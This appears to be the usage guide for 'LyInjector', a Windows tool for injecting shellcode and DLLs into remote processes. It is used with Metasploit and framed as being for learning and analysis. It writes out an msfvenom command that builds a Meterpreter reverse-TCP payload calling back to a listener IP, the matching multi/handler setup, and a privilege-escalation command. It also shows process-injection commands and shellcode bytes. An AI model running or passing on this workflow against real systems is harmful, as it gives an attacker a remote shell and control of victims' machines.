A fully functional Windows injection analysis tool developed in C++, leveraging native Win32 user-mode APIs to perform low-level operations related to processes, memory, and executable files. Featuring a modular architecture design and standardized command-line interaction, the tool integrates capabilities such as payload encoding/decoding, binary byte conversion, remote process DLL injection, remote process ShellCode injection, PE file static modification, and cross-architecture compatibility. It can be applied to scenarios including learning injection principles, analyzing ShellCode evasion techniques, PE file structure reverse engineering, and reproducing malicious injection behavior characteristics.

This tool is primarily used in conjunction with Metasploit to generate ShellCode. When generating ShellCode with Metasploit, this tool can perform operations such as encoding, injection, and uninstallation. To use this tool, you must first generate ShellCode compatible with the target system architecture, convert it into a byte array format, encode it using the built-in encoder, and then inject the encoded result into the target process.

Generate a payload using the Metasploit tool, and the following is the 32-bit payload generation command.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```

The configuration of the backend listener needs to correspond to the number of bits in the payload when using the tool. These options will tell Metasploit which payload to use and which IP address and port to bind the listener to. The ExitOnSession option is optional. If set to false, the listener will not automatically exit after establishing a session and can continue to wait for new connections. The final exploit - j command sets the listener to run in the background.

```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 10.0.66.22
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit
```

## Show

Used to display all currently injectable processes, this command can quickly obtain a list of all running processes in the current system.

```bash
C:> LyInjector Show

[*] PID：     4 | 位数：x64 | 进程名：System
[*] PID：   124 | 位数：x64 | 进程名：Registry
[*] PID：   588 | 位数：x64 | 进程名：smss.exe
[*] PID：   872 | 位数：x64 | 进程名：csrss.exe
[*] PID：   972 | 位数：x64 | 进程名：wininit.exe
[*] PID：   980 | 位数：x64 | 进程名：csrss.exe
[*] PID：   496 | 位数：x64 | 进程名：services.exe
[*] PID：  6624 | 位数：x32 | 进程名：lyshark.exe
[*] PID：  9196 | 位数：x64 | 进程名：SearchProtocolHost.exe
[*] PID： 11376 | 位数：x64 | 进程名：LyInjector.exe
```

## ShowDll

List the names and memory address information of all dynamic link library (DLL) modules loaded in the specified process. Assist developers and system administrators in viewing DLL modules loaded in processes for diagnosis and debugging purposes, as well as for security auditing and malware detection to identify potential security issues.

```bash
C:> LyInjector ShowDll --proc lyshark.exe

[+] DLL名称:           USER32.dll | DLL基地址: 0x0000000076B70000
[+] DLL名称:        MSVCR120D.dll | DLL基地址: 0x000000006A3E0000
[+] DLL名称:         KERNEL32.dll | DLL基地址: 0x00000000773A0000
```

## Promote

Attempt to enhance its own process permissions. Process permissions refer to the level of permissions that a process has in the operating system, and different permission levels can allow the process to perform different operations.

```bash
C:> LyInjector Promote

[+] 获取自身Token
[+] 查询进程特权
[*] 已提升为超级管理员
```

## FreeDll

Attempt to uninstall a dynamic link library (DLL) module within a specified process. Users can release an already loaded DLL module to reload the updated DLL module or resolve some resource leakage issues.

```bash
C:> LyInjector FreeDll --proc lyshark.exe --dll MSVCR120D.dll

[*] 模块卸载状态: 1
```

## GetFuncAddr

Display the base address (address) of a function within a specific module of a specified process. With this command, users can obtain the memory address information of functions within a specific module, which is very useful for development and debugging tasks that require direct access to specific functions.

```bash
C:> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --func MessageBoxA

[+] 函数地址: 0x76bf0ba0

C:> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --func MessageBoxW

[+] 函数地址: 0x76bf10c0
```

## Format

Format the attack payload as a single line of pure string for use in different application scenarios, such as executing on the command line, sending to network traffic, or writing scripts.

```bash
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:> LyInjector Format --path d://shellcode.txt

fce88f0000006031d2648b52308b520c89e58b521431ff0fb74a268b7228f0b5a2566a0053ffd5
```







